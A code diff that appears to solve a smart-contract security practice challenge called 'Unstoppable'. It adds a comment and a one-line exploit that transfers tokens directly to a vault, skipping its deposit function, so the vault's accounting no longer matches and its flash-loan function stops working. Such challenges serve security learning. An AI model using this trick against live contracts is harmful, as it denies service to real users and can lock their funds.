@@ -22,6 +22,7 @@ describe('[Challenge] Unstoppable', function () {
         expect(await vault.asset()).to.eq(token.address);
 
         await token.approve(vault.address, TOKENS_IN_VAULT);
+        // Since it's the first deposit, deployer will now have `TOKENS_IN_VAULT` shares
         await vault.deposit(TOKENS_IN_VAULT, deployer.address);
 
         expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT);
@@ -45,6 +46,18 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        /**
+         * After setup, we have the following:
+         * - token.balanceOf(vault) = vault.totalAssets() = TOKENS_IN_VAULT **tokens**
+         * - vault.totalSupply() = TOKENS_IN_VAULT **shares**
+         * 
+         * If we (`player`) deposit our `INITIAL_PLAYER_TOKEN_BALANCE DVT` tokens via the
+         * `token` contract and not using the `vault.deposit()` function, the `vault.flashLoan()`
+         * function will break.
+         */
+        
+        await token.connect(player).transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE)
     });
 
     after(async function () {
